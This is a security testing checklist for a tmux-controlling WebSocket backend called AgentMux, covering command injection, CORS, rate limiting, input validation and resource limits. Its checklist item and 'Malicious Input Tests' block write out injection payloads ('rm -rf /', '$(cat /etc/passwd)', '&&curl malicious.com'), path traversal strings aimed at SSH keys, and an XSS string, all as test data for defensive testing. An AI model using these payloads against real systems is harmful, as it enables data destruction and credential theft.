# AgentMux Backend Security Testing Checklist

## 🔒 Critical Security Areas

### 1. Command Injection Prevention
- [ ] Validate all tmux commands before execution
- [ ] Sanitize session names, window names, and message content
- [ ] Test with malicious payloads: `; rm -rf /`, `$(whoami)`, `\`cat /etc/passwd\``
- [ ] Verify tmux commands are properly escaped
- [ ] Test special characters in session/window names

### 2. Network Security
- [ ] Verify server only binds to localhost/127.0.0.1 in production
- [ ] Test CORS configuration - should reject unauthorized origins in production
- [ ] Validate rate limiting is working (100 requests per 15 minutes)
- [ ] Test helmet security headers are applied
- [ ] Verify WebSocket CORS restrictions

### 3. Input Validation & Sanitization
- [ ] Test oversized JSON payloads (>1MB limit)
- [ ] Validate all socket.io event data
- [ ] Test null/undefined values in required fields
- [ ] Test extremely long strings in session/window names
- [ ] Validate numeric inputs for window/pane IDs

### 4. Authentication & Authorization
- [ ] No authentication currently implemented - document security risk
- [ ] Verify no sensitive data in error messages
- [ ] Test unauthorized access to tmux operations
- [ ] Validate session isolation (if applicable)

### 5. Error Handling & Information Disclosure
- [ ] Test error responses don't leak system information
- [ ] Verify stack traces aren't exposed to clients
- [ ] Test malformed requests return appropriate errors
- [ ] Validate tmux command failures are handled gracefully

### 6. Resource Protection
- [ ] Test concurrent connection limits
- [ ] Validate memory usage under load
- [ ] Test file descriptor limits
- [ ] Verify no unbounded resource allocation

### 7. WebSocket Security
- [ ] Test malformed WebSocket frames
- [ ] Validate connection cleanup on disconnect
- [ ] Test rapid connect/disconnect cycles
- [ ] Verify callback function security

## 🧪 Test Scenarios

### Malicious Input Tests
```javascript
// Command injection attempts
"session'; rm -rf /tmp; echo 'pwned"
"$(cat /etc/passwd)"
"`whoami`"
"session\n\nrm -rf /"
"session&&curl malicious.com"

// Path traversal
"../../etc/passwd"
"../../../root/.ssh/id_rsa"

// Overflows
"A".repeat(10000)
"\x00\x01\x02"
"<script>alert('xss')</script>"
```

### Network Security Tests
- Attempt connections from unauthorized origins
- Test rate limiting with automated requests
- Verify localhost binding prevents external access
- Test HTTPS upgrade behavior

### Resource Exhaustion Tests
- Open maximum concurrent WebSocket connections
- Send rapid-fire socket events
- Create hundreds of tmux windows
- Test memory usage with large payloads

## 🚨 High-Risk Areas

1. **tmux Command Execution** - Direct shell access risk
2. **No Authentication** - Anyone can control tmux sessions
3. **WebSocket Events** - Unvalidated input to system commands
4. **CORS Configuration** - Overly permissive in development
5. **Process Spawning** - node-pty could be dangerous

## 📋 Manual Testing Checklist

- [ ] Start server and verify port binding
- [ ] Test health endpoint returns expected response
- [ ] Connect WebSocket client and test all events
- [ ] Attempt to inject commands in various parameters
- [ ] Test error conditions and validate responses
- [ ] Monitor system resources during testing
- [ ] Verify no unauthorized file access
- [ ] Test graceful shutdown behavior

## 🔍 Automated Tests Required

- Unit tests for all tmux operations
- Integration tests for WebSocket events
- Security-focused test cases
- Load testing with concurrent connections
- Fuzzing tests for input validation